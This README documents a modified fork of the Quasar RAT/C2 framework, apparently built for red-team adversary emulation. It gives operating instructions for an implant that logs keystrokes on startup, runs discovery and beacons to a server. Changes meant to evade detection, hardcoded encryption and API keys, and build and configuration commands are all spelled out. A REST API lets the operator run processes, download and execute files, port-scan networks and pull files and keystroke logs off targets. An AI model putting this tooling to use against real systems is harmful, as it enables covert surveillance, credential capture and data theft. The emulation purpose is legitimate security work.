# Quasar (Modified)

This modified fork of Quasar builds on the existing [Quasar C2 framework](https://github.com/quasar/Quasar/tree/bcca6010de2c3cf5780deaaed33d1f44b097d10a) by MaxXor.

- The original license can be found [here](./LICENSE) and on the [original Github](https://github.com/quasar/Quasar/blob/bcca6010de2c3cf5780deaaed33d1f44b097d10a/LICENSE).
- The original README can be found on the [original Github](https://github.com/quasar/Quasar/blob/bcca6010de2c3cf5780deaaed33d1f44b097d10a/README.md).

Several modifications have been made, including the following:

- Removed components that were not needed or used in the evaluation, to make the client more lightweight and reduce chances of detection:
  - Credential access from browsers and other password stores
  - Batch-script functionality to restart the implant
  - Error-handling approach to automatically restart the implant via batch script
  - Client update functionality
  - Client website-visiting functionality
  - Client geolocation detection via 3rd-party websites
- Adjusted existing IOCs
  - Assembly information
  - File names and paths
  - Other setting/configuration info
- Added port scan tasking capability to the implant
- Added logging capabilities to the server and implant for troubleshooting (client-side logs are encrypted using AES-256-CBC and hardcoded key)
- Added REST API functionality to the server to programmatically manage implants

# Quasar Client/Implant

## Features

When starting up, the client will automatically do the following:

- perform several discovery procedures
- start logging keystrokes
- connect to the C2 server

The C2 server and other configuration settings are compiled into the implant binary, meaning that any changes will require
the user to compile a new implant binary.

Each implant is associated with a unique ID, which is calculated by taking the MD5 hash of the target hostname + target username + the target user account type.

Since each implant checks for a hardcoded mutex to avoid duplicate implant sessions, you will need to rebuild an implant with
a different mutex value if you want to have multiple implant sessions running simultaneously on a given machine.

## Usage

To run the Quasar implant manually, you can simply run the implant binary:

```
.\Client.exe
```

## Troubleshooting and Logging

Currently, the implant writes to a log file `clientmanagement.log` in its current working directory.
In debug mode, the log entries are in plaintext.
In release mode, Each log entry is a base64-encoded encrypted message.
AES-256-CBC encryption is used with a hardcoded key: `cc4acde9286d68e6a540c93576d2169106d8affda5123f3dfbdf9eb2fd3278e6`.
To decrypt the logs, please use the Evals c2 server utility python script `decryptquasarlogs.py`:

```
python3 decryptquasarlogs.py -i /path/to/encrypted/logs -o out.txt
```

Here are some potential problems that you may run into with either the Quasar server or client, and how you can go about troubleshooting them:

- Can't start a client process
  - Check the logs to see at what point the client process terminates. Note that only one instance of a Quasar client can run on a target machine
    at a time, since Quasar checks for the global mutex.
- Client won't connect to the C2 server
  - Check for any error messages in the log file, and ensure your client settings are set to connect to the correct server and that
    the certificate information is correct.
- Connection seems to hang between Quasar server and client
  - If your client process is alive, but you can't seem to task it via API, try restarting the Quasar server so the connection can reset.
  - In the log file output, try searching for `disconnect` to get an idea of the root cause.

## Encryption

Quasar client settings are encrypted and authenticated using AES-256-CBC and SHA256 HMAC.
The `ENCRYPTIONKEY` setting value is used as a passphrase to derive the AES and HMAC keys via PBKDF2 (50000 iterations, SHA256 hashing function, salt value `b0a0f82bbff1d2b5dab062a0bfe4312e3d9efaf34cd929292bc2a93d323b09ef`).
Currently, the setting value of `"D088E59E5C03F101FFC97A8469FE5C6E3C3380EC"` will generate the following keys:

- AES: `1767c472eb822fb4e012fa605a6b546389a04a4997121f4189d307fb64e94eba`
- HMAC auth: `f7a6d3cf948610539b9991fccd858ac1a74c482e56c2c373c72157d2e4c1494de58cc18439f2dde0c3f293188072fe3f831e16ddb0d768621bba1b1705ec9f42`

String literal setting values in `Quasar.Client/Config/Settings.cs` are base64-encoded ciphertext blobs: HMAC(IV + ciphertext) + IV + ciphertext.
These values are decoded and decrypted when the client starts up. Note that since these values are hardcoded, changing settings will require re-encrypting and regenerating HMAC hashes. You may use the `config_enc_util.py` utility to generate these (Note: recommended to run this script on Linux to avoid quote issues on Windows.)

Usage:

```
pip3 install pycryptodome
python3 config_enc_util.py -p [ENCRYPTIONKEY password value] -i "string to encrypt and encode"
```

Example:

```
python3 config_enc_util.py -p D088E59E5C03F101FFC97A8469FE5C6E3C3380EC -i "https://www.google.com/"
```

## Build

Built using Visual Studio and .NET 4.7.2.

# Quasar Server

## Usage

To run the Quasar Server, provide the path to the certificate file as well as the IP address for the REST API server to bind to:

```
.\Quasar.exe [-c CERT_FILE_PATH] [-ip REST_API_BIND_ADDR] [-p|port REST_API_PORT]
```

By default, the REST API server will bind to all interfaces and listen on port 8888. If no certificate file path is provided, the Quasar
Server will attempt to read the `quasar.p12` file from the same directory as the `Quasar.exe` binary.

For example:

```
# REST API server will only listen on 10.0.2.9:8000
.\Quasar.exe -ip 10.0.2.9 -p 8000 -c quasar.p12

# REST API server will listen on all interfaces on default port 8888
.\Quasar.exe -c quasar.p12
```

### Creating or Changing Server Certificates
If using the Quasar server for the first time, you will need to generate a `quasar.p12` certificate and update the Quasar client setting values.

To generate a new certificate:
- Run the server without the `-c` flag and without an existing `quasar.p12` cert in the server's working directory
- When the Quasar Certificate Wizard popup appears, click "Create" and then wait for the certificate details to populate the window. Click "Save" and then "Ok".
- A filesystem window will appear showing where the `quasar.p12` cert file was generated, and the Quasar server GUI will also appear.

- Open the `QuasarServerLogs.txt` log file in the Quasar server's working directory, find the `Quasar Options` line, and make note of the following values:
    - `Encryption key`
    - `Server Cert (base64)`
    - `Server Cert Signature (base64)`

The below log output provides an example
```text
[DEBUG] 2025-02-06 18:08:18: Quasar Options:
[DEBUG] 2025-02-06 18:08:18: Encryption key: 7DA227310A3CF11510AB8EF7221638F366530CDF
[DEBUG] 2025-02-06 18:08:18: Server Cert (base64):
[DEBUG] 2025-02-06 18:08:18: MIIE8jCCAtqgAwI... (truncated for readability)
[DEBUG] 2025-02-06 18:08:18: Server Cert Signature (base64):
[DEBUG] 2025-02-06 18:08:18: O0IFdXaFfMyfq6a52... (truncated for readability)
[INFO] 2025-02-06 18:08:18: Listening...
```

Now that the Quasar server certificate has changed, you will need to replace several Quasar client setting values that are decrypted at run-time using the certificate. These values are in the `Quasar.Client\Config\Settings.cs` file, and they need to be re-encrypted and replaced using the `resources/config_enc_util.py` Python script on a Linux machine. You can reference the below commands to see which settings need to be reencrypted and replaced, and you can replace the values according to your environment and cert encryption key. Note that for the `-p` script argument, you will need to use the `Encryption key` value from the Quasar server logs (in the above example log output, `7DA227310A3CF11510AB8EF7221638F366530CDF`). 
```bash
# HOSTS value - replace the example localhost:4782 C2 address 
# with a semicolon-separated list of your C2 server values 
# (e.g. host1:443;host2:80;). 
# Make sure to keep the trailing semicolon
python3 config_enc_util.py -p 7DA227310A3CF11510AB8EF7221638F366530CDF -i "localhost:4782;"

# SUBDIRECTORY value
python3 config_enc_util.py -p 7DA227310A3CF11510AB8EF7221638F366530CDF -i "Client"

# INSTALLNAME value
python3 config_enc_util.py -p 7DA227310A3CF11510AB8EF7221638F366530CDF -i "Client.exe"

# MUTEX VALUE
python3 config_enc_util.py -p 7DA227310A3CF11510AB8EF7221638F366530CDF -i "sfkj39tg2qevuaoisvhkjg4qksjcvhkq2p"

# STARTUPKEY registry value for the client
python3 config_enc_util.py -p 7DA227310A3CF11510AB8EF7221638F366530CDF -i "ClientStartup"

# TAG value
python3 config_enc_util.py -p 7DA227310A3CF11510AB8EF7221638F366530CDF -i "RELEASE"

# LOGDIRECTORYNAME value
python3 config_enc_util.py -p 7DA227310A3CF11510AB8EF7221638F366530CDF -i "Logs"

# SERVERSIGNATURE value
# use the "Server Cert Signature (base64)" output from the Quasar server logs
python3 config_enc_util.py -p 7DA227310A3CF11510AB8EF7221638F366530CDF -i "O0IFdXaFfMyfq6a52..."

# SERVERCERTIFICATESTR value
# use the "Server Cert (base64)" output from the Quasar server logs
python3 config_enc_util.py -p 7DA227310A3CF11510AB8EF7221638F366530CDF -i "MIIE8jCCAtqgAwI..."

# DOWNLOADURL value for the client to use to check for internet connectivity
python3 config_enc_util.py -p 7DA227310A3CF11510AB8EF7221638F366530CDF -i "https://www.google.com/"
```

For each Python script invocation, copy the output into the corresponding string setting value in `Settings.cs`.

Also make sure to update the `ENCRYPTIONKEY` setting value with the encryption key hex string (e.g. `7DA227310A3CF11510AB8EF7221638F366530CDF`). This string must not be encrypted or further encoded.

Once you have replaced the setting values, rebuild the client binary. Your client should now be able to connect to the Quasar Server.

### Changing Client Settings
If you need to change client settings such as the Quasar server address, log directory, or mutex value, you will need to encrypt and encode the new setting value and replace the old one in the `Quasar.Client\Config\Settings.cs` source code file and rebuild the client binary. 

If using the same Quasar server certificate as before, you can use the existing `ENCRYPTIONKEY` value and the `config_enc_util.py` Python script to generate the new encrypted/encoded setting value. Otherwise, if you are using a different certificate, follow the instructions in the [Creating or Changing Server Certificates section](#creating-or-changing-server-certificates).

## Logging

Server logs are written in plaintext to `QuasarServerLogs.txt` in the server's current working directory.

## REST API Functionality

The Quasar C2 server REST API was designed to be compatible with the existing Evals C2 server framework - users can use the corresponding Evals C2 handler to
track and manage Quasar implant sessions. Typically, users will not need to make raw API requests, as the Evals C2 handler will take care of those under the hood.
Most use cases will be satisfied by using the existing `evalsC2client.py` script.

The REST API server will listen on port 8888 by default.

Files that the Quasar implant uploads to the Quasar server via API tasking will be stored in the `uploads` folder in the Quasar server's current working directory.

The following endpoints and features are supported:

### View Existing Session Information

`GET /api/beacons` - fetch a JSON list of active Quasar implant sessions. The return format for a Quasar implant session dictionary is as follows:

- `id`: the implant's unique ID
- `username`: username of the user that the implant is running under
- `hostname`: hostname of the machine on which the implant is running
- `ip_addr`: IP address of the machine on which the implant is running
- `os`: target machine operating system
- `account_type`: account type of the implant user. Possible values: `Admin`, `User`, `Guest`
- `tag`: implant tag for categorization purposes
- `country_code`: country code of the target machine
- `hardware_id`: hardware ID of the target machine

Example:

```
# GET /api/beacons
[
    {
        "id": "5CEF61CF22ACA6F40918643E3AAA0772",
        "username": "testuser",
        "hostname": "testhost",
        "ip_addr": "127.0.0.1",
        "os": "Windows 10 Pro 64 Bit",
        "account_type": "User",
        "tag": "RELEASE",
        "country_code": "US",
        "hardware_id": "AF67031351B51509F0C8C756CE7B1810A06783AE8750F53179FAD93023D5E585"
    }
]
```

### Task Implants

`GET /api/tasks/{task_id}` - Fetch a JSON dictionary containing information for the Quasar implant task pertaining to the given `task_id`.
The response dictionary format varies depending on the type of task, but they will always contain the following fields:

- `task_id`: string representing the task ID
- `task_type`: int representing the task type (e.g. `1` for process creation)
- `task_status`: int representing the task status
  - `0` means that the task was carried out successfully
  - `1` means the task errored out
  - `2` means that the task is pending
- `task_status_msg`: string providing extra details on `task_status`, such as an error message for a `task_status` of `2`.

`POST /api/tasks` - create a task (non-file transfer. For file transfers, use the `/api/transfers` endpoint) for the implant to execute, such as creating a process. Requires POST data consisting of a JSON dictionary with the following fields:

- `client_id`: string containing the ID of the Quasar implant to task
- `task_type`: int representing the type of the task to execute.
  - `1` for process creation
  - `5` to initiate a port scan
- The remaining fields depend on the type of task to perform.

### Process Creation Tasks

For process creation tasks (`task_type` of `1`), include the following fields in the POST JSON dictionary:

- `proc_path`: (optional) string containing path to the binary to execute. If ommitted, `download_url` and `download_dst` will be used to determine which file to execute.
- `proc_args`: (optional) string containing the process arguments. Multiple arguments must be combined into a single string, such as `"/flag word1 word2"`
- `download_url`: (optional) URL string pointing to the file to download and execute with `proc_args`, if provided. If `download_dst` is provided, the file will be saved to that path, otherwise a random name is selected with an `.exe` extension. This field is only required if `proc_path` is not provided.
- `download_dst`: (optional) filepath string indicating where to save the file downloaded from `download_url`
- `use_shell`: (optional) boolean indicating whether or not to use the operating system shell to start the process. Default is `false`. For more information, please refer to the [Microsoft documentation](https://learn.microsoft.com/en-us/dotnet/api/system.diagnostics.processstartinfo.useshellexecute?view=netframework-4.7.2)
- `get_output`: (optional) boolean indicating whether or not to wait for the implant to wait for the process to complete and send stdout/stderr to the server. Default is `true`. Cannot be enabled if `use_shell` is also set to true - the server will set `get_output` to false if both are enabled. Note that the implant will wait for process completion in a separate thread in order to handle multiple tasks in parallel.
- `no_window`: (optional) boolean indicating whether or not to start the process in a new window. Default is `true`. Note that some processes, such as `notepad.exe` will appear in a new window regardless. Mainly used to prevent command-line executables such as `hostname.exe` from briefly flashing a new window on execution.

For `GET /api/tasks/{task_id}` requests pertaining to a process creation task, the response dictionary will contain the following fields in addition to the base response fields and the fields/values from the request dictionary:

- `pid`: int representing the process ID of the created process. Will be `-1` if the task hasn't yet completed, since the implant sends this information to the C2 server.
- `exit_code`: int representing the exit code of the created process. Will be `-1` if the process hasn't yet finished. Only populated if `get_output` was set to true.
- `stdout`: string representing the standard output of the process. Will be empty if the process hasn't yet finished. Only populated if `get_output` was set to true.
- `stderr`: string representing the standard error of the process. Will be empty if the process hasn't yet finished. Only populated if `get_output` was set to true.

Examples:

```
## Process creation with args, not yet completed.
# POST /api/tasks
# POST data: '{"client_id": "0B4C114149C3E9A6CBEE590B72F08D4E", "task_type": 1, "proc_path": "whoami.exe", "proc_args": "/all" }'
{
    "task_id": "caedfd24-2078-42b6-9a7e-e8724173073a",
    "task_type": 1,
    "task_status": 2,
    "task_status_msg": "",
    "proc_path": "whoami.exe",
    "proc_args": "/all",
    "download_url": "",
    "download_dst": "",
    "use_shell": false,
    "get_output": true,
    "no_window": true,
    "pid": -1,
    "exit_code": -1,
    "stdout": "",
    "stderr": ""
}

## Task info for a completed task with stdout
# GET /api/tasks/{task_id}
{
    "task_id": "97bfb33b-d16b-4c06-92dc-95086b618e4a",
    "task_type": 1,
    "task_status": 0,
    "task_status_msg": "",
    "proc_path": "hostname.exe",
    "proc_args": "",
    "download_url": "",
    "download_dst": "",
    "use_shell": false,
    "get_output": true,
    "no_window": true,
    "pid": 27356,
    "exit_code": 0,
    "stdout": "dummyhostname\n",
    "stderr": ""
}

## Task info for a completed task with stderr
# GET /api/tasks/{task_id}
{
    "task_id": "6af38b85-6179-4859-8452-f7d016cf41e6",
    "task_type": 1,
    "task_status": 0,
    "task_status_msg": "",
    "proc_path": "net.exe",
    "proc_args": "",
    "download_url": "",
    "download_dst": "",
    "use_shell": false,
    "get_output": true,
    "no_window": true,
    "pid": 23616,
    "exit_code": 1,
    "stdout": "",
    "stderr": "The syntax of this command is:\nNET\n    [ ACCOUNTS | COMPUTER | CONFIG | CONTINUE | FILE | GROUP | HELP |\n      HELPMSG | LOCALGROUP | PAUSE | SESSION | SHARE | START |\n      STATISTICS | STOP | TIME | USE | USER | VIEW ]\n"
}

## Task info for an executed process without waiting for completion
# GET /api/tasks/{task_id}
{
    "task_id": "03001dad-1d0d-4814-b6d1-70cf44b82246",
    "task_type": 1,
    "task_status": 0,
    "task_status_msg": "",
    "proc_path": "notepad.exe",
    "proc_args": "",
    "download_url": "",
    "download_dst": "",
    "use_shell": false,
    "get_output": false,
    "no_window": true,
    "pid": 11740,
    "exit_code": -1,
    "stdout": "",
    "stderr": ""
}
```

### Port Scan Tasks

For port scan tasks (`task_type` of `5`), include the following fields in the POST JSON dictionary:

- `range`: string containing a valid CIDR range (e.g. `10.1.2.0/24`) to scan
- `ports`: int array containing the ports to scan the target `range` for

For `GET /api/tasks/{task_id}` requests pertaining to a process creation task, the response dictionary will contain the following fields in addition to the base response fields and the fields/values from the request dictionary:

- `range`: CIDR string for the scanned network
- `ports`: int array containing the scanned ports
- `result`: dictionary mapping IP address string to int array of open ports based on the provided target `ports` to scan.

Examples:

```
## Task port scan
# POST /api/tasks
# POST data: '{"client_id": "5CEF61CF22ACA6F40918643E3AAA0772", "task_type": 5, "range": "10.0.2.9/28", "ports": [8888,3389]}'
{
    "task_id": "c875ed5d-07a0-46ac-b031-a6865330197a",
    "task_type": 5,
    "task_status": 2,
    "task_status_msg": "",
    "range": "10.0.2.9/28",
    "ports": [
        8888,
        3389
    ],
    "result": {}
}

## Task info for a completed port scan
# GET /api/tasks/{task_id}
{
    "task_id": "c875ed5d-07a0-46ac-b031-a6865330197a",
    "task_type": 5,
    "task_status": 0,
    "task_status_msg": "",
    "range": "10.0.2.9/28",
    "ports": [
        8888,
        3389
    ],
    "result": {
        "10.0.2.4": [
            3389
        ],
        "10.0.2.5": [
            3389
        ],
        "10.0.2.7": [
            3389
        ],
        "10.0.2.8": [
            3389
        ],
        "10.0.2.9": [
            8888,
            3389
        ],
        "10.0.2.10": [
            3389
        ],
        "10.0.2.11": [
            3389
        ],
        "10.0.2.12": [
            3389
        ],
        "10.0.2.13": [
            3389
        ],
        "10.0.2.14": [
            3389
        ],
        "10.0.2.15": [
            3389
        ]
    }
}
```

### File Downloads and Uploads

`GET /api/transfers` - fetch a JSON list of all file transfers throughout the Quasar server session. The return format for a Quasar file transfer
dictionary is as follows:

- `id`: the transfer's unique ID
- `type`: transfer type. `0` for server-to-client, `1` for client-to-server
- `size`: size, in bytes, of file transferred.
- `transferred_size`: number of bytes transferred so far
- `local_path`: file source path
- `remote_path`: file destination path
- `status_msg`: Status message for the file transfer (e.g. `Completed`)
- `status`: integer status code for the file transfer:
  - `0`: completed successfully
  - `1`: ran into an error
  - `2`: pending
  - `3`: canceled

`GET /api/transfers/{transfer_id}` - fetch a JSON dictionary containing information for the Quasar file transfer pertaining to the given `transfer_id`

`POST /api/transfers` - create a file transfer task by POSTing a JSON dictionary with the following fields:

- `client_id`: string containing the ID of the Quasar implant to task
- `type`: int representing the transfer type. 0 for server-to-client, 1 for client-to-server
- `source`: string representing the path of the source file to transfer. If performing a server-to-client transfer, this path must be a valid path on the Quasar server. If performing a client-to-server transfer, this path must exist on the target machine where the implant is running.
- `dest`: string representing the filepath or filename to save the file as. If performing a server-to-client transfer, the file will be saved using the specified filepath on the target machine where the implant is running. If performing a client-to-server transfer, the file will be saved using the specified filename in the `uploads` subdirectory of the Quasar server's current working directory. Optional for client-to-server transfers - if not provided, it will take the filename based on the `source` filepath.

`GET /api/uploadedfiles` - fetch a JSON dictionary mapping file upload transfer IDs to the saved file path on the Quasar server

`GET /api/uploadedfiles/{transfer_id}` - request the uploaded file pertaining to the given `transfer_id`

Examples:

```
# GET /api/transfers
[
    {
        "id": 1477877996,
        "type": 0,
        "size": 4821,
        "transferred_size": 4821,
        "local_path": "C:\\Users\\testuser\\myfile.text",
        "remote_path": "C:\\Users\\Public\\myfile.text",
        "status_msg": "Completed",
        "status": 0
    }
]

# GET /api/transfers/1477877996
{
    "id": 1477877996,
    "type": 0,
    "size": 4821,
    "transferred_size": 4821,
    "local_path": "C:\\Users\\testuser\\myfile.text",
    "remote_path": "C:\\Users\\Public\\myfile.text",
    "status_msg": "Completed",
    "status": 0
}

# GET /api/uploadedfiles
{
    "1438023322": "C:\\Users\\testuser\\path\\to\\uploaded\\file.txt",
    "1098610208": "C:\\Users\\testuser\\path\\to\\uploaded\\file.log"
}

## client-to-server transfer
# POST /api/transfers
# POST data: '{"client_id": "0B4C114149C3E9A6CBEE590B72F08D4E", "type": 1, "source": "C:\\Users\\Public\\cleanup.ps1", "dest": "transfer.ps1" }'
{
    "id": 356532246,
    "type": 1,
    "size": 0,
    "transferred_size": 0,
    "local_path": "C:\\Users\\testuser\\Quasar\\uploads\\transfer.ps1",
    "remote_path": "C:\\Users\\Public\\cleanup.ps1",
    "status_msg": "Pending...",
    "status": 2
}

## Server to client transfer
# POST /api/transfers
# POST data: '{"client_id": "0B4C114149C3E9A6CBEE590B72F08D4E", "type": 0, "source": "C:\\Windows\\System32\\notepad.exe", "dest": "C:\\Users\\Public\\npcopy.exe" }'
{
    "id": 310008463,
    "type": 0,
    "size": 201216,
    "transferred_size": 0,
    "local_path": "C:\\Windows\\System32\\notepad.exe",
    "remote_path": "C:\\Users\\Public\\npcopy.exe",
    "status_msg": "Pending...",
    "status": 2
}
```

#### Keystroke Log Uploads

While `/api/transfers` is for generic file uploads and downloads, you can use the `/api/transfers/keylogger` endpoint to manage keystroke log uploads, which is a special type of file upload task for QuasarRat.
The Quasar server will task the Quasar client to enumerate all files within its keystroke log directory, and the Quasar server will then generate individual file transfer tasks for each of those keystroke log files.
Keystroke log files are uploaded to the `uploads/logged_keystrokes/{client_id}` subdirectory of the Quasar server's current working directory, where `client_id` is the ID string of the client that uploaded the files.
For instance, keystroke log uploads for client `5CEF61CF22ACA6F40918643E3AAA0772` will go to `uploads\logged_keystrokes\5CEF61CF22ACA6F40918643E3AAA0772`.

`POST /api/transfers/keylogger` - create a file transfer task by POSTing a JSON dictionary with the following fields:

- `client_id`: string containing the ID of the Quasar implant to task

`GET /api/transfers/keylogger/{task_id}` - returns a JSON dictionary containing information on the keystroke log upload task with ID `task_id`. The dictionary will contain the following fields:

- `task_id`: Task ID string
- `status`: integer status code for the upload task:
  - `0`: completed successfully
  - `1`: ran into an error
  - `2`: pending
  - `3`: canceled
  - `4`: partial success (some logs failed to upload)
  - `5`: pending incomplete (unable to generate file transfers for some log files, other log files still in progress)
- `status_msg`: Status message for the upload task (e.g. `Successfully retrieved all logs`)
- `status_err_msg`: Status error message providing more context on non-success error codes.
- `transfer_ids`: list of integers representing the file transfer IDs for the keystroke log files being uploaded. These can be queried via `GET /api/transfers/{transfer_id}` for individual transfer information.

Examples:

```
# GET /api/transfers/keylogger/{task_id}
{
    "task_id": "fb76942c-9f28-4c0d-ab5a-7b4b5858fdb9",
    "status": 0,
    "status_msg": "Successfully retrieved all logs",
    "status_err_msg": "",
    "transfer_ids": [
        521350519
    ]
}

# POST /api/transfers/keylogger
# POST data: '{"client_id": "5CEF61CF22ACA6F40918643E3AAA0772"}'
{
    "task_id": "3b2a0ccb-d3fc-492e-a65b-ccd93606353d",
    "status": 2,
    "status_msg": "",
    "status_err_msg": "",
    "transfer_ids": []
}
```

### Authentication

All REST API requests must have an `APIKEY` header with the following API key string value: `81152cc4c24d327f8fe800afbfb9777c`.
Incorrect or missing API keys will result in a `401 Unauthorized.` response from the REST API server.
This authentication method is set to prevent other parties from sending queries to the Quasar REST API server to obtain
information on red team activity.

Example curl commands with the API key:

```
curl -s -H "APIKEY:81152cc4c24d327f8fe800afbfb9777c" http://10.0.2.9:8888/api/beacons
```

## Build

Built using Msbuild and .NET 4.7.2 (use release configuration for static builds):

```
MSBuild.exe Quasar.sln /t:Restore /p:Configuration=Release
MSBuild.exe Quasar.sln /t:Build /p:Configuration=Release
```
